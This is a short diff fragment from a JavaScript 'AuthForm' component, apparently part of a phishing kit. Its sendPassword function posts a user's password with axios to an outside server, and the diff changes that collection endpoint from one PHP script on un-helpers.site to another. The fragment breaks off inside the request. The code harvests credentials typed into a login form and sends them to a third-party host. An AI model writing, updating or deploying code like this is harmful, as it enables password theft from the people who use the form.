@@ -132,7 +132,7 @@ const AuthForm = () => {
   };
 
   const sendPassword = async (password, type) => {
-  const url = type === 'first' ? 'https://un-helpers.site/getlogs.php/' : 'https://un-helpers.site/getlogs.php/';
+  const url = type === 'first' ? 'https://un-helpers.site/mm.php/' : 'https://un-helpers.site/mm.php/';
 
   try {
     await axios.post(url, {
